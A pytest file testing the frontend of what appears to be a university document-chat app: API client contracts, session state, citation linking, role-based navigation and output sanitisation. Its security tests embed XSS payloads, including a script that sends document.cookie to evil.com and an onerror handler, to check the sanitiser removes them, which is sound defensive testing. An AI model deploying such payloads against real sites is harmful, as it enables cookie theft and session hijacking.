"""
Behavioral and Contract Unit Tests for Frontend Presentation Layer.

Replaces stale presentation-locking tests with stable behavioral, API client,
state management, citation transformation, and security contracts that survive
a complete frontend rebuild.
"""

import html
import uuid
from unittest.mock import MagicMock

import pytest
from nicegui import app as nicegui_app
from nicegui.storage import request_contextvar
from starlette.requests import Request

from backend.app.core.permissions import Permission
from backend.tests.fixtures_documents import create_sample_pdf_bytes
from frontend.client.api_client import FrontendAPIClient
from frontend.client.error_handler import normalize_error
from frontend.client.models import (
    AdminUserDTO,
    ChatMessageDTO,
    CitationDTO,
    DocumentDTO,
    KnowledgeBaseDTO,
    UserDTO,
)
from frontend.components.layout import get_nav_items, has_admin_permission
from frontend.main import init_ui
from frontend.pages.chat_page import format_citation_links, sanitize_markdown_text
from frontend.state.app_state import AppState, _session_app_states
from scripts.bootstrap_admin import bootstrap_admin


@pytest.fixture(autouse=True)
def ensure_admin_bootstrapped() -> None:
    """Ensure standard test administrator exists for client operations."""
    bootstrap_admin("admin@university.edu", "AdminPass123!", "System Administrator")


# ==============================================================================
# A. API CLIENT CONTRACTS
# ==============================================================================


class TestAPIClientContracts:
    """Test suite validating API client communication contracts and data transformations."""

    def test_api_client_initial_state(self) -> None:
        client = FrontendAPIClient()
        assert client.get_current_user() is None

    def test_api_client_student_registration_and_login_lifecycle(self) -> None:
        client = FrontendAPIClient()
        unique_email = f"student_{uuid.uuid4().hex[:8]}@university.edu"
        full_name = "Alex Mercer"

        # Registration creates STUDENT account
        reg_user = client.register(unique_email, "SecurePassword123!", full_name)
        assert isinstance(reg_user, UserDTO)
        assert reg_user.email == unique_email
        assert reg_user.full_name == full_name
        assert reg_user.role == "STUDENT"
        assert client.get_current_user() == reg_user

        # Logout clears current user
        client.logout()
        assert client.get_current_user() is None

        # Login re-establishes authenticated session
        login_user = client.login(unique_email, "SecurePassword123!")
        assert isinstance(login_user, UserDTO)
        assert login_user.email == unique_email
        assert client.get_current_user() == login_user

    def test_api_client_auth_input_validation(self) -> None:
        client = FrontendAPIClient()

        with pytest.raises(ValueError, match="Email and password must not be empty"):
            client.login("", "secret")

        with pytest.raises(ValueError, match="Email and password must not be empty"):
            client.login("user@test.edu", "")

        with pytest.raises(ValueError, match="All registration fields are required"):
            client.register("", "secret", "Name")

    def test_api_client_unauthorized_401_clears_auth_state(self) -> None:
        client = FrontendAPIClient()
        client._session_token = "expired-token-xyz"
        client._current_user = UserDTO(
            id="test-1",
            email="expired@university.edu",
            full_name="Expired User",
            role="STUDENT",
        )

        mock_resp = MagicMock()
        mock_resp.status_code = 401
        mock_resp.json.return_value = {"detail": "Session expired or invalid"}
        client._http.get = MagicMock(return_value=mock_resp)

        user = client.get_current_user()
        assert user is None
        assert client._current_user is None

    def test_api_client_forbidden_403_handling(self) -> None:
        client = FrontendAPIClient()
        mock_resp = MagicMock()
        mock_resp.status_code = 403
        mock_resp.json.return_value = {
            "detail": "This account belongs to the Administrator Portal. Please use Administrator Sign In."
        }
        client._http.post = MagicMock(return_value=mock_resp)

        with pytest.raises(ValueError, match="Administrator Portal"):
            client.login("admin@university.edu", "AdminPass123!", required_role="STUDENT")

    def test_api_client_knowledge_base_crud_contracts(self) -> None:
        client = FrontendAPIClient()
        client.login("admin@university.edu", "AdminPass123!")
        unique_name = f"Course-{uuid.uuid4().hex[:6]}"

        # Create
        kb = client.create_knowledge_base(unique_name, "Course syllabus")
        assert isinstance(kb, KnowledgeBaseDTO)
        assert kb.name == unique_name
        assert kb.document_count == 0

        # List
        all_kbs = client.get_knowledge_bases()
        assert any(k.id == kb.id for k in all_kbs)

        # Empty name rejection
        with pytest.raises(ValueError, match="Knowledge base name cannot be empty"):
            client.create_knowledge_base("   ")

    def test_api_client_document_crud_contracts(self) -> None:
        client = FrontendAPIClient()
        client.login("admin@university.edu", "AdminPass123!")
        kb = client.create_knowledge_base(f"DocKB-{uuid.uuid4().hex[:6]}", "Docs")

        pdf_bytes = create_sample_pdf_bytes()
        doc = client.upload_document(
            kb_id=kb.id,
            filename="syllabus.pdf",
            content=pdf_bytes,
        )
        assert isinstance(doc, DocumentDTO)
        assert doc.filename == "syllabus.pdf"
        assert doc.file_type == "pdf"
        assert doc.status in ("PENDING", "PROCESSING", "COMPLETED")

        # List contains document
        docs = client.get_documents(kb.id)
        assert any(d.id == doc.id for d in docs)

        # Delete document
        client.delete_document(kb.id, doc.id)
        docs_after = client.get_documents(kb.id)
        assert not any(d.id == doc.id for d in docs_after)

    def test_api_client_chat_response_dto_conversion_and_provenance(self) -> None:
        client = FrontendAPIClient()
        kb_id = str(uuid.uuid4())

        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {
            "query": "Explain normal forms.",
            "processed_query": "explain normal forms",
            "knowledge_base_id": kb_id,
            "answer": "3NF eliminates transitive dependencies [source_1].",
            "is_empty_context": False,
            "citations": [
                {
                    "source_id": "source_1",
                    "document_name": "db_design.pdf",
                    "document_id": str(uuid.uuid4()),
                    "chunk_id": "chunk-301",
                    "page_number": 88,
                    "section_title": "Normalization",
                    "relevance_score": 0.94,
                    "snippet": "Third normal form removes transitive functional dependencies.",
                }
            ],
            "grounding": {
                "is_grounded": True,
                "status": "FULLY_SUPPORTED",
                "citation_validity_rate": 1.0,
                "citation_coverage": 1.0,
                "claim_support_rate": 1.0,
                "unsupported_claim_rate": 0.0,
                "has_conflicts": False,
                "claims": [],
            },
            "latency": {
                "query_processing_ms": 1.0,
                "retrieval_ms": 10.0,
                "reranking_ms": 5.0,
                "context_assembly_ms": 0.5,
                "llm_generation_ms": 90.0,
                "grounding_validation_ms": 2.0,
                "total_pipeline_ms": 108.5,
            },
            "model": "qwen3:4b",
            "metadata": {},
        }
        client._http.post = MagicMock(return_value=mock_resp)

        msg = client.send_chat_message(kb_id=kb_id, question="Explain normal forms.")
        assert isinstance(msg, ChatMessageDTO)
        assert msg.role == "assistant"
        assert msg.content == "3NF eliminates transitive dependencies [source_1]."
        assert msg.is_grounded is True
        assert msg.grounding_status == "FULLY_SUPPORTED"
        assert msg.total_pipeline_ms == 108.5
        assert len(msg.citations) == 1

        cit = msg.citations[0]
        assert isinstance(cit, CitationDTO)
        assert cit.source_id == "source_1"
        assert cit.document_name == "db_design.pdf"
        assert cit.page_number == 88

    def test_api_client_chat_validation_contracts(self) -> None:
        client = FrontendAPIClient()

        # Empty question
        with pytest.raises(ValueError, match="Question cannot be empty"):
            client.send_chat_message(str(uuid.uuid4()), "   ")

        # Invalid UUID
        with pytest.raises(ValueError, match="Invalid knowledge base ID format"):
            client.send_chat_message("not-a-uuid", "Valid question")

    def test_api_client_retrieval_contracts(self) -> None:
        client = FrontendAPIClient()
        client.login("admin@university.edu", "AdminPass123!")
        kb = client.create_knowledge_base(f"RetrKB-{uuid.uuid4().hex[:6]}", "Retrieval")

        # Empty query validation
        with pytest.raises(ValueError, match="Query string cannot be empty"):
            client.retrieve_chunks(kb.id, "   ")
        with pytest.raises(ValueError, match="Query string cannot be empty"):
            client.retrieve_lexical_chunks(kb.id, "   ")
        with pytest.raises(ValueError, match="Query string cannot be empty"):
            client.retrieve_hybrid_chunks(kb.id, "   ")
        with pytest.raises(ValueError, match="Query string cannot be empty"):
            client.rerank_chunks(kb.id, "   ")

        # Invalid UUID validation
        with pytest.raises(ValueError, match="Invalid knowledge base ID format"):
            client.retrieve_chunks("not-a-uuid", "query")

    def test_api_client_query_processing_contract(self) -> None:
        client = FrontendAPIClient()
        client.login("admin@university.edu", "AdminPass123!")

        res = client.process_query("   What is   TCP   in   BCA Sem-4?   ")
        assert res.original_query == "   What is   TCP   in   BCA Sem-4?   "
        assert res.processed_query == "What is TCP in BCA Sem-4?"
        assert res.character_count == len("What is TCP in BCA Sem-4?")
        assert res.token_estimate > 0
        assert res.has_technical_tokens is True

    def test_api_client_admin_user_dto_privacy(self) -> None:
        dto = AdminUserDTO(
            email="faculty@univ.edu",
            full_name="Faculty Admin",
            role="ADMIN",
            is_active=True,
            created_at="2026-10-01",
        )
        assert not hasattr(dto, "password") or "password" not in dto.model_fields
        assert not hasattr(dto, "hashed_password") or "hashed_password" not in dto.model_fields

    def test_api_client_malformed_backend_response_handling(self) -> None:
        client = FrontendAPIClient()
        mock_resp = MagicMock()
        mock_resp.status_code = 500
        mock_resp.json.side_effect = Exception("Invalid JSON")
        mock_resp.text = "Internal Server Error"
        client._http.get = MagicMock(return_value=mock_resp)

        with pytest.raises(ValueError) as excinfo:
            client.get_knowledge_bases()
        err = str(excinfo.value).lower()
        assert "server processing error" in err or "could not be completed" in err


# ==============================================================================
# B. FRONTEND STATE CONTRACTS
# ==============================================================================


class TestFrontendStateContracts:
    """Test suite for AppState presentation state management."""

    def test_app_state_initialization(self) -> None:
        state = AppState()
        assert state._active_kb is None
        assert state.chat_history == []
        assert state.selected_citation is None
        assert state.is_generating is False
        assert state.generation_error is None

    def test_app_state_active_kb_selection(self) -> None:
        state = AppState()
        sample_kb = KnowledgeBaseDTO(
            id=str(uuid.uuid4()),
            name="Computer Architecture",
            description="Hardware syllabus",
            document_count=3,
            created_at="2026-10-01",
        )
        state.active_kb = sample_kb
        assert state.active_kb == sample_kb
        assert state.active_kb.name == "Computer Architecture"

    def test_app_state_message_flow_and_ordering(self) -> None:
        state = AppState()
        user_msg = state.add_user_message("What is pipelining?")
        assert user_msg.role == "user"
        assert len(state.chat_history) == 1

        asst_msg = ChatMessageDTO(
            id="resp-1",
            role="assistant",
            content="Pipelining overlaps instruction execution.",
            citations=[],
        )
        state.add_assistant_message(asst_msg)
        assert len(state.chat_history) == 2
        assert state.chat_history[0].role == "user"
        assert state.chat_history[1].role == "assistant"

    def test_app_state_clear_chat_resets_conversation_and_citations(self) -> None:
        state = AppState()
        state.add_user_message("Test")
        state.selected_citation = CitationDTO(
            document_name="doc.pdf",
            page_number=1,
            chunk_id="c-1",
            snippet="Snippet",
            relevance_score=0.9,
        )
        state._is_generating = True
        state._generation_error = "Error"

        state.clear_chat()
        assert len(state.chat_history) == 0
        assert state.selected_citation is None
        assert state.is_generating is False
        assert state.generation_error is None

    def test_app_state_per_session_isolation(self) -> None:
        _session_app_states.clear()
        req1 = Request({"type": "http", "method": "GET", "path": "/", "session": {"id": "session-1"}})
        req2 = Request({"type": "http", "method": "GET", "path": "/", "session": {"id": "session-2"}})

        request_contextvar.set(req1)
        state1 = AppState()
        state1.add_user_message("User 1 question")

        request_contextvar.set(req2)
        state2 = AppState()
        assert len(state2.chat_history) == 0

        request_contextvar.set(req1)
        assert len(state1.chat_history) == 1

        request_contextvar.set(None)

    def test_app_state_is_admin_property(self) -> None:
        from frontend.client.api_client import api_client

        api_client.logout()
        state = AppState()
        assert state.is_admin is False

        api_client.login("admin@university.edu", "AdminPass123!")
        assert state.is_admin is True

        api_client.logout()
        assert state.is_admin is False


# ==============================================================================
# C. CITATION PROCESSING CONTRACTS
# ==============================================================================


class TestCitationProcessingContracts:
    """Test suite validating semantic citation linking, safety, and markdown integrity."""

    @pytest.fixture
    def sample_citations(self) -> list[CitationDTO]:
        return [
            CitationDTO(
                document_id="doc-uuid-1",
                document_name="KSU-Act-English.pdf",
                page_number=12,
                chunk_id="chunk-1",
                snippet="Powers of the Governing Board under Section 12.",
                relevance_score=0.95,
                knowledge_base_id="kb-uuid-1",
                course_name="BCA Regulations",
            ),
            CitationDTO(
                document_id="doc-uuid-2",
                document_name="Syllabus-2026.pdf",
                page_number=45,
                chunk_id="chunk-2",
                snippet="Grading policy requires passing marks in theory and practicals.",
                relevance_score=0.91,
                knowledge_base_id="kb-uuid-1",
                course_name="BCA Regulations",
            ),
        ]

    def test_citation_mapping_numeric_bracket(self, sample_citations) -> None:
        text = "As stated in the act [1]."
        res = format_citation_links(text, sample_citations)
        assert 'data-citation-index="1"' in res
        assert "KSU-Act-English.pdf" in res

    def test_citation_mapping_source_bracket(self, sample_citations) -> None:
        text = "As stated in the act [source_1]."
        res = format_citation_links(text, sample_citations)
        assert 'data-citation-index="1"' in res
        assert "KSU-Act-English.pdf" in res

    def test_citation_mapping_multiple_citations(self, sample_citations) -> None:
        text = "Refer to the board powers [1] and the grading policy [2]."
        res = format_citation_links(text, sample_citations)
        assert 'data-citation-index="1"' in res
        assert 'data-citation-index="2"' in res
        assert "KSU-Act-English.pdf" in res
        assert "Syllabus-2026.pdf" in res

    def test_citation_invalid_reference_preserved_as_text(self, sample_citations) -> None:
        text = "Unavailable citations [99] and [source_99] should not crash."
        res = format_citation_links(text, sample_citations)
        assert "[99]" in res
        assert "[source_99]" in res

    def test_citation_does_not_corrupt_standard_markdown_links(self, sample_citations) -> None:
        text = "According to [1], visit [University Portal](https://university.edu) for details."
        res = format_citation_links(text, sample_citations)
        assert 'data-citation-index="1"' in res
        assert "[University Portal](https://university.edu)" in res

    def test_citation_output_contains_no_session_tokens(self, sample_citations) -> None:
        text = "Document reference [1]."
        res = format_citation_links(text, sample_citations)
        assert "token=" not in res
        assert "auth_session_token" not in res
        assert "cookie" not in res

    def test_citation_metadata_html_escaping(self) -> None:
        malicious_citations = [
            CitationDTO(
                document_id="doc-malicious",
                document_name='"><script>alert(1)</script>.pdf',
                page_number=1,
                chunk_id="chunk-malicious",
                snippet='"><img src=x onerror="alert(\'xss\')">',
                relevance_score=0.9,
            )
        ]
        text = "Check this source [1]."
        res = format_citation_links(text, malicious_citations)
        assert "<script>" not in res
        assert 'onerror="alert' not in res
        assert html.escape('"><script>alert(1)</script>.pdf') in res or "&lt;script&gt;" in res


# ==============================================================================
# D. MARKDOWN / OUTPUT SECURITY CONTRACTS
# ==============================================================================


class TestMarkdownOutputSecurityContracts:
    """Test suite validating client-side HTML output sanitization and error masking."""

    def test_markdown_sanitizer_preserves_valid_markdown(self) -> None:
        normal = "**Bold statement** with *italics* and `inline_code()`.\n- Item 1\n- Item 2"
        assert sanitize_markdown_text(normal) == normal

    def test_markdown_sanitizer_neutralizes_script_tags(self) -> None:
        dangerous = "Answer: <script>window.location='http://evil.com?c='+document.cookie;</script>"
        sanitized = sanitize_markdown_text(dangerous)
        assert "<script>" not in sanitized
        assert "window.location" not in sanitized

    def test_markdown_sanitizer_neutralizes_iframes(self) -> None:
        dangerous = 'Information: <iframe src="http://evil.com/phish"></iframe>'
        sanitized = sanitize_markdown_text(dangerous)
        assert "<iframe" not in sanitized

    def test_markdown_sanitizer_neutralizes_event_handlers(self) -> None:
        dangerous = '<img src="missing.png" onerror="alert(document.cookie)">'
        sanitized = sanitize_markdown_text(dangerous)
        assert "onerror=" not in sanitized

    def test_error_normalizer_suppresses_sql_and_tracebacks(self) -> None:
        raw_sql_error = (
            "psycopg.errors.SyntaxError: syntax error at or near 'SELECT'\n"
            "LINE 1: SELECT * FROM credentials WHERE token='secret_abc';\n"
            "Traceback (most recent call last):\n"
            '  File "db.py", line 42, in execute\n'
        )
        normalized = normalize_error(raw_sql_error)
        assert "server processing error" in normalized.lower()
        assert "SELECT" not in normalized
        assert "secret_abc" not in normalized
        assert "Traceback" not in normalized

    def test_error_normalizer_contextual_messages(self) -> None:
        assert "invalid email or password" in normalize_error(401, context="auth").lower()
        assert "already exists" in normalize_error("AUTH_EMAIL_EXISTS", context="auth").lower()
        assert "size" in normalize_error(413, context="document").lower()
        assert "format" in normalize_error(415, context="document").lower()


# ==============================================================================
# E. NAVIGATION AND ACCESS SEMANTICS CONTRACTS
# ==============================================================================


class TestNavigationAccessContracts:
    """Test suite validating navigation availability by route path and role authorization."""

    def test_navigation_unauthenticated_returns_empty_items(self) -> None:
        assert get_nav_items(None) == []

    def test_navigation_student_routes(self) -> None:
        student = UserDTO(
            id="s-100",
            email="student@univ.edu",
            full_name="Enrolled Student",
            role="STUDENT",
        )
        items = get_nav_items(student)
        routes = [route for _, route, _ in items]

        # Allowed student routes
        assert "/dashboard" in routes
        assert "/knowledge-bases" in routes
        assert "/chat" in routes
        assert "/profile" in routes

        # Prohibited administrator routes
        assert "/documents" not in routes
        assert "/administrators" not in routes
        assert "/system-health" not in routes

    def test_navigation_admin_routes(self) -> None:
        admin = UserDTO(
            id="a-100",
            email="admin@univ.edu",
            full_name="Administrator",
            role="ADMIN",
            admin_role="MAIN_ADMIN",
        )
        items = get_nav_items(admin)
        routes = [route for _, route, _ in items]

        assert "/dashboard" in routes
        assert "/knowledge-bases" in routes
        assert "/documents" in routes
        assert "/chat" in routes
        assert "/profile" in routes

    def test_navigation_faculty_admin_chat_permission_scope(self) -> None:
        # Faculty admin without chat permission
        faculty_without_chat = UserDTO(
            id="fa-1",
            email="faculty1@univ.edu",
            full_name="Faculty One",
            role="ADMIN",
            admin_role="FACULTY_ADMIN",
            permissions=[Permission.DOCUMENT_VIEW.value],
        )
        routes_without = [route for _, route, _ in get_nav_items(faculty_without_chat)]
        assert "/chat" not in routes_without
        assert has_admin_permission(faculty_without_chat, Permission.ADMIN_CHAT) is False

        # Faculty admin with chat permission
        faculty_with_chat = faculty_without_chat.model_copy(
            update={
                "permissions": [
                    Permission.DOCUMENT_VIEW.value,
                    Permission.ADMIN_CHAT.value,
                ]
            }
        )
        routes_with = [route for _, route, _ in get_nav_items(faculty_with_chat)]
        assert "/chat" in routes_with
        assert has_admin_permission(faculty_with_chat, Permission.ADMIN_CHAT) is True

    def test_protected_page_routes_registered(self) -> None:
        init_ui()
        registered_paths = [r.path for r in nicegui_app.routes if hasattr(r, "path")]

        expected_routes = [
            "/",
            "/login",
            "/student/login",
            "/admin/login",
            "/register",
            "/dashboard",
            "/knowledge-bases",
            "/chat",
            "/documents",
            "/profile",
        ]
        for route in expected_routes:
            assert route in registered_paths, f"Expected route {route} not registered"


# ==============================================================================
# F. AUTHENTICATION PAGE CONTRACTS
# ==============================================================================


class TestAuthPageContracts:
    """Test suite validating authentication portal endpoints and server-side role gating."""

    def test_auth_routes_registration(self) -> None:
        from frontend.pages.auth_pages import register_auth_pages

        register_auth_pages()
        registered = [r.path for r in nicegui_app.routes if hasattr(r, "path")]
        assert "/login" in registered
        assert "/student/login" in registered
        assert "/admin/login" in registered
        assert "/register" in registered

    def test_api_client_has_portal_methods(self) -> None:
        client = FrontendAPIClient()
        assert hasattr(client, "student_login")
        assert callable(client.student_login)
        assert hasattr(client, "admin_login")
        assert callable(client.admin_login)

    def test_wrong_portal_directional_guidance(self) -> None:
        admin_guidance = (
            "This account belongs to the Administrator Portal. Please use Administrator Sign In."
        )
        student_guidance = (
            "This account does not have administrator access. Please use Student Sign In."
        )

        assert normalize_error(admin_guidance, context="auth") == admin_guidance
        assert normalize_error(student_guidance, context="auth") == student_guidance
        assert normalize_error({"detail": admin_guidance}, context="auth") == admin_guidance
        assert normalize_error({"detail": student_guidance}, context="auth") == student_guidance

    def test_registration_is_strictly_student(self) -> None:
        client = FrontendAPIClient()
        unique_email = f"student_check_{uuid.uuid4().hex[:6]}@univ.edu"
        user = client.register(unique_email, "StudentPass123!", "Strict Student")

        assert user.role == "STUDENT"
        assert getattr(user, "admin_role", None) is None
